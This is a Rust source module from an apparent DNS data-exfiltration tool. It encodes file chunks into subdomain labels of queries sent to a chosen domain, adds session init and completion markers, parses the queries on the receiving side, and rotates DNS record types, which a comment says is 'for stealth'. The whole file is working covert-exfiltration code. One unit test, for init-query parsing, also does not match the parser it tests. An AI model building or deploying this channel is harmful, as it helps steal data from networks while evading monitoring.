//! DNS query construction for data exfiltration.
//!
//! Encodes chunk data into DNS subdomain labels using the format:
//! [payload].[sequence].[session].<domain>

use crate::common::constants::MAX_LABEL_LENGTH;
use crate::common::error::{GhostQueryError, Result};
use crate::common::types::{Chunk, ChunkId, DnsRecordType, SessionId};
use crate::encoding::GhostEncoder;

/// A DNS query for exfiltrating data
#[derive(Debug, Clone)]
pub struct DnsQuery {
    /// The full QNAME (subdomain.domain)
    pub qname: String,
    /// Record type to request
    pub record_type: DnsRecordType,
    /// Session ID (for tracking)
    pub session_id: SessionId,
    /// Chunk ID being sent
    pub chunk_id: ChunkId,
    /// Whether this is the final chunk
    pub is_final: bool,
}

impl DnsQuery {
    /// Create a new DNS query from a chunk
    pub fn from_chunk(
        chunk: &Chunk,
        session_id: SessionId,
        domain: &str,
        record_type: DnsRecordType,
    ) -> Result<Self> {
        let encoder = GhostEncoder::new();

        // Encode the chunk data
        let payload = encoder.encode_chunk(&chunk.data)?;

        // Build the QNAME: payload_labels.seq-XXXXXX.session.<domain>
        let seq_label = format!("seq-{:06x}", chunk.id.as_u32());
        let session_label = session_id.to_hex();

        // Split payload into labels of max 63 chars each
        let payload_labels = Self::split_into_labels(&payload, MAX_LABEL_LENGTH);

        let qname = format!("{}.{}.{}.{}", payload_labels, seq_label, session_label, domain);

        Ok(Self {
            qname,
            record_type,
            session_id,
            chunk_id: chunk.id,
            is_final: chunk.is_final,
        })
    }

    /// Split a string into multiple DNS labels of max_len each
    fn split_into_labels(s: &str, max_len: usize) -> String {
        if s.len() <= max_len {
            return s.to_string();
        }

        let mut labels = Vec::new();
        let mut remaining = s;
        
        while !remaining.is_empty() {
            let (label, rest) = if remaining.len() > max_len {
                remaining.split_at(max_len)
            } else {
                (remaining, "")
            };
            labels.push(label);
            remaining = rest;
        }

        labels.join(".")
    }

    /// Create a session initialization query
    pub fn session_init(session_id: SessionId, file_hash: &str, domain: &str) -> Self {
        // Split hash into two labels (max 63 chars each, hash is 64 chars)
        let hash_part1 = &file_hash[..32.min(file_hash.len())];
        let hash_part2 = if file_hash.len() > 32 { &file_hash[32..] } else { "" };
        
        let qname = format!("init.{}.{}.{}.{}", hash_part1, hash_part2, session_id.to_hex(), domain);

        Self {
            qname,
            record_type: DnsRecordType::A, // Use A record for consistent handling
            session_id,
            chunk_id: ChunkId::new(0),
            is_final: false,
        }
    }

    /// Create a session completion query
    pub fn session_complete(session_id: SessionId, domain: &str) -> Self {
        let qname = format!("done.{}.{}", session_id.to_hex(), domain);

        Self {
            qname,
            record_type: DnsRecordType::A, // Use A record for consistent handling
            session_id,
            chunk_id: ChunkId::new(u32::MAX),
            is_final: true,
        }
    }

    /// Get the record type as a string
    pub fn record_type_str(&self) -> &'static str {
        match self.record_type {
            DnsRecordType::A => "A",
            DnsRecordType::AAAA => "AAAA",
            DnsRecordType::CNAME => "CNAME",
            DnsRecordType::MX => "MX",
            DnsRecordType::TXT => "TXT",
        }
    }
}

/// Parse a DNS query QNAME to extract session and chunk info
#[derive(Debug)]
pub struct ParsedQuery {
    pub payload: String,
    pub sequence: u32,
    pub session_id: SessionId,
    pub is_init: bool,
    pub is_done: bool,
}

impl ParsedQuery {
    /// Parse a QNAME into its components
    pub fn parse(qname: &str, domain: &str) -> Result<Self> {
        // Remove the domain suffix
        let prefix = qname
            .strip_suffix(&format!(".{}", domain))
            .or_else(|| qname.strip_suffix(domain))
            .ok_or_else(|| {
                GhostQueryError::InvalidDomainFormat(format!("Expected domain {}", domain))
            })?;

        let parts: Vec<&str> = prefix.split('.').collect();

        if parts.len() < 2 {
            return Err(GhostQueryError::InvalidDomainFormat(
                "Not enough labels".to_string(),
            ));
        }

        // Check for special queries
        if parts[0] == "init" {
            // init.hash1.hash2.session (hash split into two 32-char labels)
            if parts.len() < 4 {
                return Err(GhostQueryError::InvalidDomainFormat(
                    "Invalid init query".to_string(),
                ));
            }
            // Session ID is in parts[3] (after hash1, hash2)
            let session_id = SessionId::from_hex(parts[3]).map_err(|_| {
                GhostQueryError::InvalidDomainFormat("Invalid session ID".to_string())
            })?;

            // Reconstruct full hash from two parts
            let full_hash = format!("{}{}", parts[1], parts[2]);

            return Ok(Self {
                payload: full_hash,
                sequence: 0,
                session_id,
                is_init: true,
                is_done: false,
            });
        }

        if parts[0] == "done" {
            // done.session
            let session_id = SessionId::from_hex(parts[1]).map_err(|_| {
                GhostQueryError::InvalidDomainFormat("Invalid session ID".to_string())
            })?;

            return Ok(Self {
                payload: String::new(),
                sequence: u32::MAX,
                session_id,
                is_init: false,
                is_done: true,
            });
        }

        // Normal data query: payload_labels.seq-XXXXXX.session
        // Find the seq- label to determine where payload ends
        let seq_idx = parts.iter().position(|p| p.starts_with("seq-"));
        
        if seq_idx.is_none() || parts.len() < 3 {
            return Err(GhostQueryError::InvalidDomainFormat(
                "Not enough labels for data query or missing seq- label".to_string(),
            ));
        }

        let seq_idx = seq_idx.unwrap();
        
        // Payload is all parts before seq-
        let payload = parts[..seq_idx].join("");

        // Parse sequence number
        let seq_part = parts[seq_idx];
        let sequence = u32::from_str_radix(&seq_part[4..], 16).map_err(|_| {
            GhostQueryError::InvalidDomainFormat("Invalid sequence number".to_string())
        })?;

        // Session ID is after seq-
        if seq_idx + 1 >= parts.len() {
            return Err(GhostQueryError::InvalidDomainFormat(
                "Missing session ID".to_string(),
            ));
        }
        
        let session_id = SessionId::from_hex(parts[seq_idx + 1])
            .map_err(|_| GhostQueryError::InvalidDomainFormat("Invalid session ID".to_string()))?;

        Ok(Self {
            payload,
            sequence,
            session_id,
            is_init: false,
            is_done: false,
        })
    }
}

/// Query builder for creating DNS queries with rotation
pub struct QueryBuilder {
    domain: String,
    session_id: SessionId,
    current_type: DnsRecordType,
    encoder: GhostEncoder,
}

impl QueryBuilder {
    /// Create a new query builder
    pub fn new(domain: String, session_id: SessionId) -> Self {
        Self {
            domain,
            session_id,
            current_type: DnsRecordType::A,
            encoder: GhostEncoder::new(),
        }
    }

    /// Build a query for a chunk
    pub fn build_chunk_query(&mut self, chunk: &Chunk) -> Result<DnsQuery> {
        let query = DnsQuery::from_chunk(chunk, self.session_id, &self.domain, self.current_type)?;

        // Rotate record type for stealth
        self.current_type = self.current_type.next();

        Ok(query)
    }

    /// Build an init query
    pub fn build_init_query(&self, file_hash: &str) -> DnsQuery {
        DnsQuery::session_init(self.session_id, file_hash, &self.domain)
    }

    /// Build a completion query
    pub fn build_done_query(&self) -> DnsQuery {
        DnsQuery::session_complete(self.session_id, &self.domain)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_query_from_chunk() {
        let session_id = SessionId::from_bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]);
        let chunk = Chunk::new(ChunkId::new(0), vec![0xAB, 0xCD], false);

        let query =
            DnsQuery::from_chunk(&chunk, session_id, "example.com", DnsRecordType::A).unwrap();

        assert!(query.qname.ends_with("example.com"));
        assert!(query.qname.contains("seq-000000"));
        assert_eq!(query.chunk_id, ChunkId::new(0));
    }

    #[test]
    fn test_parse_query() {
        let domain = "example.com";
        let qname = "cdn-ab-01.seq-00002a.0102030405060708.example.com";

        let parsed = ParsedQuery::parse(qname, domain).unwrap();

        assert_eq!(parsed.sequence, 0x2a);
        assert!(!parsed.is_init);
        assert!(!parsed.is_done);
    }

    #[test]
    fn test_parse_init_query() {
        let domain = "example.com";
        let qname = "init.abcdef123456.0102030405060708.example.com";

        let parsed = ParsedQuery::parse(qname, domain).unwrap();

        assert!(parsed.is_init);
        assert_eq!(parsed.payload, "abcdef123456");
    }

    #[test]
    fn test_parse_done_query() {
        let domain = "example.com";
        let qname = "done.0102030405060708.example.com";

        let parsed = ParsedQuery::parse(qname, domain).unwrap();

        assert!(parsed.is_done);
    }

    #[test]
    fn test_query_builder_rotation() {
        let session_id = SessionId::new();
        let mut builder = QueryBuilder::new("example.com".to_string(), session_id);

        let chunk = Chunk::new(ChunkId::new(0), vec![0x01, 0x02], false);

        let q1 = builder.build_chunk_query(&chunk).unwrap();
        let q2 = builder.build_chunk_query(&chunk).unwrap();

        // Record types should rotate
        assert_ne!(q1.record_type, q2.record_type);
    }
}

